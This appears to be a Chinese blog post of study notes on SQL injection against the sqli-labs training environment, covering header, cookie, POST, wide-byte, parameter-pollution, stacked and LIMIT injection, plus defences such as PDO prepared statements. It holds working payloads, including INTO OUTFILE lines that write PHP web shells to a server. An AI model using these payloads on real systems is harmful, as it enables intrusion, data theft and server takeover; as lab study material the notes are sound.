<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">数据库中接收参数的语句为 </span><br><span class="line">	$uagent = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;];</span><br><span class="line">	$IP = $_SERVER[&#x27;REMOTE_ADDR&#x27;];</span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311173048631.png" alt="image-20220311173048631"></p>
<p>0. 数据库中闭合语句为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br></pre></td></tr></table></figure>
<p>最终 payload 有两种形式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: 1&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) )#</span><br><span class="line">User-Agent: 1&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;1&#x27;=&#x27;1</span><br><span class="line">//注意不能直接使用#注释，否则会产生括号不匹配，要是用#必须手动加后半个括号补齐</span><br></pre></td></tr></table></figure>
<p>也可以使用 sqlmap 注入，但要注意默认的等级 level1 是不对 uagent 检测的</p>
<h5 id="cookie注入"><a class="markdownIt-Anchor" href="#cookie注入">#</a> cookie 注入</h5>
<p>通过没有过滤 cookie 字段的值产生的 cookie 注入</p>
<p>sqllab pass-20</p>
<p>注意在抓包时需要先和服务器进行一次交互，使得服务器返回 cookie</p>
<p>验证存在注入：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311175929845.png" alt="image-20220311175929845"></p>
<p>进行注入：<br>
<img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311180121906.png" alt="image-20220311180121906"></p>
<p>最终构造的 paylaod 为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=admin&#x27;and updatexml(1,concat(0x7e,(select version()),0x7e),1) #</span><br><span class="line">Cookie: uname=admin&#x27;and updatexml(1,concat(0x7e,(select version()),0x7e),1) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
<p>不加 <code>)</code>  的原因是他的查询语句长这样：</p>
<p>​      <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>q</mi><mi>l</mi><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>S</mi><mi>E</mi><mi>L</mi><mi>E</mi><mi>C</mi><mi>T</mi><mo>∗</mo><mi>F</mi><mi>R</mi><mi>O</mi><mi>M</mi><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>s</mi><mi>W</mi><mi>H</mi><mi>E</mi><mi>R</mi><mi>E</mi><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><msup><mo>=</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">sql=&quot;SELECT * FROM users WHERE username=&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">&quot;</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">u</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal">u</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">n</span><span class="mord mathnormal">a</span><span class="mord mathnormal">m</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel">=</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>cookee’ LIMIT 0,1&quot;;</p>
<p>你只需要闭合 <code>'</code>  不再需要闭合 <code>)</code></p>
<h5 id="post注入"><a class="markdownIt-Anchor" href="#post注入">#</a> post 注入</h5>
<p>通过 post 提交的参数中注入</p>
<p>postman,hackbar,burpsuite 可以提交 post 参数</p>
<p>sqli - less11</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=-1&#x27; union select 1,2#&amp;passws=1111</span><br></pre></td></tr></table></figure>
<p>sqlmap 两种形式</p>
<p>1. 将 http 请求包放入 txt 中</p>
<p><span class="exturl" data-url="aHR0cDovL3NxbG1hcC5weQ==">sqlmap.py</span> -r 1.txt</p>
<p>2.sqlmap -u URL --data “”</p>
<h5 id="sql读写文件注入"><a class="markdownIt-Anchor" href="#sql读写文件注入">#</a> SQL 读写文件注入</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">select into outfile  导出数据</span><br><span class="line">?id=-1&#x27; union select &lt;?php eval($_POST[&#x27;C&#x27;]);?&gt; into outfile E:/web.php</span><br><span class="line"></span><br><span class="line">outfile 导出条件</span><br><span class="line">root权限</span><br><span class="line">GPC关闭（能使用单引号)</span><br><span class="line">有绝对路径（读文件可以不用，写文件必须)</span><br><span class="line">没有配置-secure-file-priv 通过my.ini配置为空   secure-file-priv=&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">?id=-1&#x27;)) union select 1,&quot;&lt;?php phpinfo();?&gt;&quot;,3 into outfile &#x27;网站物理路径&#x27; --+</span><br><span class="line">less-7/demo.php</span><br><span class="line">?id=1&#x27;)) union select 1,2, &quot;&lt;?php @eval($_POST[a]);?&gt;&quot; into outfile &quot;D:/Phpstudy/PHPTutorial/test1.php --+</span><br><span class="line">写马的时候必须使用字符串</span><br></pre></td></tr></table></figure>
<h5 id="宽字节注入"><a class="markdownIt-Anchor" href="#宽字节注入">#</a> 宽字节注入</h5>
<p>导致原因： <code>mysql_query(&quot;set names gbk&quot;)</code>  错误使用了编码方式 gbk</p>
<p>在 GBK 下一个汉字占两个字节，UTF-8 占三个字节</p>
<p>注意关闭 magic_quotes_qpc</p>
<p>我们这里的宽字节注入是利用 mysql 的一个特性，mysql 在使用 GBK 编码的时候，会认为两个字符是一个汉字 (前 — 个 ascii 码要大于 128，才到汉字的范围)。如果我们输入 % df 看会怎样:</p>
<p>这就是 mysql 的特性，因为 gbk 是多字节编码，他认为两个字节代表一个汉字，所以 % df 和后面的转义单引号的 \ 也就是 % df%5c 变成了一个汉字 &quot; 踵”，而逃逸了出来。</p>
<p>使用 % a1 也可以，只要第一个字节 ASCII&gt;128，基本就可以被认为宽字节，不一定要组成汉字</p>
<p>sqllab less-32</p>
<p>注意：使用 post 提交时，不能自动转为 %5c，需要使用 BP 抓包提交</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220316223957869.png" alt="image-20220316223957869"></p>
<p>gbk 与 gb2312</p>
<p>gb2312 编码的取值范围。它的高位范围是 <code>0xA1~0xF7</code> ，低位范围是 <code>0xA1~0xFE</code> ，而 <code>\</code>  是 0x5c，是不在低位范围中的。所以， <code>0x5c</code>  根本不是 gb2312 中的编码，所以自然也是不会被吃掉的。</p>
<p>所以，把这个思路扩展到世界上所有多字节编码，我们可以这样认为：只要低位的范围中含有 <code>0x5c</code>  的编码，就可以进行宽字符注入。</p>
<p>在防御宽字节时大家会发现一个函数，mysql_real_escape_string，文档里说了，考虑到连接的当前字符集。</p>
<p>但在查询前必须指定 php 连接 mysql 的字符集。我们需要在执行 sql 语句之前调用一下 mysql_set_charset 函数，设置当前连接的字符集为 gbk。</p>
<p>这样就可以一定程度防止宽字节注入</p>
<p>但最好的修复方法是采用二进制连接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(&#x27;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&#x27;，$conn)</span><br></pre></td></tr></table></figure>
<p>或者采取 PDO 的方式查询</p>
<p>utf-8 与 GBK 转换</p>
<p>使用 iconv 函数转编码时调用 <code>iconv('utf-8', 'gbk', $_GET['word']);</code></p>
<p>传入 <code>錦</code> 导致报错</p>
<p>“錦 “这个字，它的 utf-8 编码是 <code>0xe98ca6</code> ，它的 gbk 编码是 <code>0xe55c</code> 。</p>
<p><code>\</code>  的 ascii 码正是 5c。那么，当我们的錦被 iconv 从 utf-8 转换成 gbk 后，变成了 % e5%5c，而后面的 <code>'</code>  被 addslashes 变成了 %5c%27，这样组合起来就是 % e5%5c%5c%27，两个 %5c 就是 \，正好把反斜杠转义了，导致’逃逸出单引号，产生注入。</p>
<p>如果我是用 iconv 将 gbk 转换成 utf-8 呢？</p>
<p>我们知道一个 gbk 汉字 2 字节，utf-8 汉字 3 字节，如果我们把 gbk 转换成 utf-8，则 php 会每两个字节一转换。所以，如果 <code>\'</code>  前面的字符是奇数的话，势必会吞掉 <code>\</code> ， <code>'</code>  逃出限制。</p>
<p>那么为什么之前 utf-8 转换成 gbk 的时候，没有使用这个</p>
<p>对于多字节的符号，其第 2、3、4 字节的前两位都是 10，也就是说， <code>\</code> （0x0000005c）不会出现在 utf-8 编码中，所以 utf-8 转换成 gbk 时，如果有 <code>\</code>  则 php 会报错</p>
<p>但因为 gbk 编码中包含了 <code>\</code> ，所以仍然可以利用</p>
<p>参考链接：</p>
<p><span class="exturl" data-url="aHR0cDovL2xlYXZlc29uZ3MuY29t">leavesongs.com</span></p>
<h5 id="hpp参数污染"><a class="markdownIt-Anchor" href="#hpp参数污染">#</a> HPP 参数污染</h5>
<p>对于当有多个 key 相同的参数时，不同服务器获取参数与情况</p>
<p>?id=1&amp;id=10</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220316200748174.png" alt="image-20220316200748174"></p>
<p><strong>php 对于两个相同 key 的参数，取第二个</strong></p>
<p>** 对于传入的非法的 $_GET 数组参数名，PHP 会将他们替换成下划线。** 经过 fuzz，有以下这些字符:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ . _ [ &#x27; &#x27;</span><br></pre></td></tr></table></figure>
<p>通过 $_SERVER [‘REQUEST_URI’] 方式获得的参数，并不会对参数中的某些特殊字符进行替换。</p>
<p>那么假设我发送的是这样一个请求： /t.php?user_id=11111&amp;user.id=22222 ，php 先将 user.id 转换成 user_id，即为 /t.php?user_id=11111&amp;user_id=22222 ，再获取到的 $_REQUEST [‘user_id’] 就是 22222。</p>
<p>** 可在\_SERVER\['REQUEST\_URI'\]中，user\_id和user\.id却是两个完全不同的参数名**，那么切割覆盖后，获取的_REQUEST [‘user_id’] 却是 11111。</p>
<p>最终 payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?user_id=-1/**/Union/**/SeLect/**/1,flag,3,4/**/from/**/users/**/limit/**/0,1</span><br><span class="line">?user_id=-1/**/Union/**/SeLect/**/1,schema_name from information_schema.schemata,3,4/**/from/**/users/**/limit/**/0,1</span><br></pre></td></tr></table></figure>
<h5 id="堆叠注入"><a class="markdownIt-Anchor" href="#堆叠注入">#</a> 堆叠注入</h5>
<p>Stacked injections (堆叠注入) 从名词的含义就可以看到应该是一堆 sql 语句 (多条) 一起执行。而在真实的运用中也是这样的，我们知道在 mysql 中，主要是命令行中，每一条语句结尾加；表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked injection。</p>
<p>堆叠注入原理</p>
<p>在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。试想一下我们在；结束一个 sql 语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而 union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于 union 或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products 服务器端生成的 sql 语句为： Select * from products where productid=1;DELETE FROM products 当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
<p>堆叠注入的使用条件十分有限，其可能受到 API 或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条 sql 语句时才能够使用，利用 mysqli_multi_query () 函数就支持多条 sql 语句同时执行，但实际情况中，如 PHP 为了防止 sql 注入机制，往往使用调用数据库的函数是 mysqli_ query () 函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限.</p>
<p>以 sqllab less-38 举例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">/* execute multi query */</span><br><span class="line">if (mysqli_multi_query($con1, $sql))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    /* store first result set */</span><br><span class="line">    if ($result = mysqli_store_result($con1))</span><br><span class="line">    &#123;</span><br><span class="line">        if($row = mysqli_fetch_row($result))</span><br><span class="line">        &#123;</span><br><span class="line">            echo &#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;;	</span><br><span class="line">            printf(&quot;Your Username is : %s&quot;, $row[1]);</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            printf(&quot;Your Password is : %s&quot;, $row[2]);</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">//            mysqli_free_result($result);</span><br><span class="line">    &#125;</span><br><span class="line">        /* print divider */</span><br><span class="line">    if (mysqli_more_results($con1))</span><br><span class="line">    &#123;</span><br><span class="line">            //printf(&quot;-----------------\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">     //while (mysqli_next_result($con1));</span><br><span class="line">&#125;</span><br><span class="line">else </span><br><span class="line">    &#123;</span><br><span class="line">	echo &#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">	print_r(mysqli_error($con1));</span><br><span class="line">	echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">    &#125;</span><br><span class="line">/* close connection */</span><br><span class="line">mysqli_close($con1);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>堆叠注入部分参考链接：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYmFja2xpb24vcC85NzIxNjg3Lmh0bWw=">https://www.cnblogs.com/backlion/p/9721687.html</span></p>
<img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220321165558549.png" alt="image-20220321165558549" style="zoom:67%;" />
<h5 id="update-insert语句中注入"><a class="markdownIt-Anchor" href="#update-insert语句中注入">#</a> update /insert 语句中注入</h5>
<p>sqllab pass-17</p>
<p>数据外带</p>
<p>floor 报错注入</p>
<p><strong>注意：update 语句中无法使用 updatexml 和 extractvalue 报错注入</strong></p>
<h5 id="limit中注入"><a class="markdownIt-Anchor" href="#limit中注入">#</a> limit 中注入</h5>
<p>只适用于 mysql 版本 &lt; 5.5</p>
<p>使用存储过程</p>
<p>为什么要用存储过程？<br>
①将重复性很高的一些操作，封装到一个存储过程中，简化了对这些 SQL 的调用</p>
<p>②批量处理：SQL + 循环，减少流量</p>
<p>③统一接口，确保数据的安全</p>
<p>使用存储过程：</p>
<p>procedure analyse (1,2) 报错在第一个参数上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure>
<p>时间盲注时但存储过程无法使用 sleep，无法盲注，使用 benchmark 代替 sleep</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</span><br></pre></td></tr></table></figure>
<h3 id="mysql注入防御"><a class="markdownIt-Anchor" href="#mysql注入防御">#</a> mysql 注入防御</h3>
<h4 id="通过函数过滤"><a class="markdownIt-Anchor" href="#通过函数过滤">#</a> 通过函数过滤</h4>
<p><code>$id = addslashed($id);</code>  使用 \ 转义字符，比如’ &quot; \ NULL</p>
<p>注意 GPG 开关开启时会默认转义所有输入，如果这时才使用此函数会造成双重转义使转义失效</p>
<p><code>$id = addcslashed($id); </code>  使用 c 语言风格转义函数 \0 \r 等</p>
<h4 id="降权"><a class="markdownIt-Anchor" href="#降权">#</a> 降权</h4>
<p>给每个数据库设置单独的管理员，不使用 root，sa 等高权限用户</p>
<h4 id="使用pdo"><a class="markdownIt-Anchor" href="#使用pdo">#</a> 使用 PDO</h4>
<p>预处理语句可以把它看作是想要运行的 SQL 的一种编译过的模板，它可以使用变量参数进行定制。</p>
<p>查询仅需解析（或预处理）一次，但可以用相同或不同的参数执行多次。当查询准备好后，数据库将分析、编译和优化执行该查询的计划。</p>
<p>提供给预处理语句的参数不需要用引号括起来，驱动程序会自动处理。如果应用程序只使用预处理语句，可以确保不会发生 SQL 注入。</p>
<p>与处理语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$pdo = new PDO(&quot;mysql:host=127.0.0.1;dbname=test;charset=utf8&quot;, &quot;root&quot;,&quot;root123&quot;);</span><br><span class="line"></span><br><span class="line">$st = $pdo-&gt;prepare(&quot;select * from users where id =?&quot;);</span><br><span class="line"></span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$st-&gt;bindParam(1, $id);</span><br><span class="line">$st-&gt;execute();</span><br><span class="line">$ret = $st-&gt;fetchAll();</span><br><span class="line">print_r($ret);</span><br></pre></td></tr></table></figure>
<p>这与我们平时使用 mysql_real_escape_string 将字符串进行转义，再拼接成 SQL 语句没有差别，只是由 PDO 本地驱动完成转义的（EMULATE_PREPARES）</p>
<p>PDO 有一项参数，名为 PDO::ATTR_EMULATE_PREPARES ，表示是否使用 PHP 本地模拟 prepare，此项参数默认 true, 我们改为 false 后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$pdo = new PDO(&quot;mysql:host=127.0.0.1;dbname=test;charset=utf8&quot;, &quot;root&quot;,&quot;root123&quot;);</span><br><span class="line">$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);</span><br><span class="line"></span><br><span class="line">$st = $pdo-&gt;prepare(&quot;select * from users where id =?&quot;);</span><br><span class="line"></span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$st-&gt;bindParam(1, $id);</span><br><span class="line">$st-&gt;execute();</span><br><span class="line">$ret = $st-&gt;fetchAll();</span><br><span class="line">print_r($ret);</span><br></pre></td></tr></table></figure>
<h3 id="绕过waf"><a class="markdownIt-Anchor" href="#绕过waf">#</a> 绕过 waf</h3>
<p>1. 过滤，</p>
<p>通过 join 绕过，将查询结果当做一张表，将多张表使用 join 连接</p>
<p>select 1,2,3 union select * from (select version()) a join  (select user()) b join  (select database()) c --+;</p>

      <div class="tags">
          <a href="/tags/SQL-injection/" rel="tag"><i class="ic i-tag"></i> SQL injection</a>
      </div>
  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">Edited on</span>
    <time title="Modified: 2022-10-19 15:16:54" itemprop="dateModified" datetime="2022-10-19T15:16:54+08:00">2022-10-19</time>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> Donate</button>
  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
  <div id="qr">
      
      <div>
        <img data-src="/images/wechatpay.png" alt="John Doe WeChat Pay">
        <p>WeChat Pay</p>
      </div>
      
      <div>
        <img data-src="/images/alipay.png" alt="John Doe Alipay">
        <p>Alipay</p>
      </div>
      
      <div>
        <img data-src="/images/paypal.png" alt="John Doe PayPal">
        <p>PayPal</p>
      </div>
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>Post author:  </strong>John Doe <i class="ic i-at"><em>@</em></i>Hexo
  </li>
  <li class="link">
    <strong>Post link: </strong>
    <a href="http://example.com/2022/03/16/SQL%E6%B3%A8%E5%85%A5/" title="SQL injection">http://example.com/2022/03/16/SQL注入/</a>
  </li>
  <li class="license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/2022/02/17/XSS/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclx6phq6j20zk0m8e36.jpg" title="XSS">
  <span class="type">Previous Post</span>
  <span class="category"><i class="ic i-flag"></i> web安全</span>
  <h3>XSS</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/2022/04/16/Upload/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipevo9j1jj20zk0m8e81.jpg" title="File upload">
  <span class="type">Next Post</span>
  <span class="category"><i class="ic i-flag"></i> web安全</span>
  <h3>File upload</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="Contents">
          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text"> SQL 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1sqli-labs-master-%E5%AE%89%E8%A3%85"><span class="toc-number">1.0.1.</span> <span class="toc-text"> 1.sqli-labs-master 安装</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E5%B0%86sqli-labs-master%E7%A7%BB%E5%8A%A8%E5%88%B0%E7%BD%91%E7%AB%99%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%B8%8B%E8%A7%A3%E5%8E%8B"><span class="toc-number">1.0.1.1.</span> <span class="toc-text"> 1. 将 sqli-labs-master 移动到网站根目录下，解压</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E4%BF%AE%E6%94%B9%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E9%85%8D%E5%90%88%E6%96%87%E4%BB%B6%E4%B8%BAsqlisql-connectionsdb-credsinc"><span class="toc-number">1.0.1.2.</span> <span class="toc-text"> 2. 修改配置文件，配合文件为： sqli&#x2F;sql-connections&#x2F;db-creds.inc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E8%BE%93%E5%85%A5%E5%AF%B9%E5%BA%94%E7%9A%84%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E5%AE%89%E8%A3%85%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A6%82%E6%9E%9C%E7%AC%AC%E4%BA%8C%E6%AD%A5%E6%9C%89%E9%94%99%E6%AD%A4%E6%AD%A5%E5%B0%86%E4%B8%8D%E8%83%BD%E6%AD%A3%E5%B8%B8%E6%89%A7%E8%A1%8C"><span class="toc-number">1.0.1.3.</span> <span class="toc-text"> 3. 浏览器打开，输入对应的文件路径，安装数据库，如果第二步有错，此步将不能正常执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E9%AA%8C%E8%AF%81%E5%AE%89%E8%A3%85%E5%AE%8C%E6%88%90%E5%90%8E%E5%8D%B3%E5%8F%AF%E6%8C%89%E5%88%B0%E5%A6%82%E4%B8%8B%E7%95%8C%E9%9D%A2"><span class="toc-number">1.0.1.4.</span> <span class="toc-text"> 4. 验证安装完成后，即可按到如下界面</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2sqlmap-%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8"><span class="toc-number">1.0.2.</span> <span class="toc-text"> 2.sqlmap 安装与使用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1kali%E8%81%94%E7%BD%91"><span class="toc-number">1.0.2.1.</span> <span class="toc-text"> 1.kali 联网</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E4%BF%AE%E6%94%B9dns-etcresolvconf"><span class="toc-number">1.0.2.2.</span> <span class="toc-text"> 2. 修改 DNS，  &#x2F;etc&#x2F;resolv.conf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E9%87%8D%E5%90%AF%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.0.2.3.</span> <span class="toc-text"> 3. 重启网络服务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4sqlmap%E4%BD%BF%E7%94%A8"><span class="toc-number">1.0.2.4.</span> <span class="toc-text"> 4.sqlmap 使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5sqlmap%E6%94%AF%E6%8C%81%E7%9A%84%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF"><span class="toc-number">1.0.2.5.</span> <span 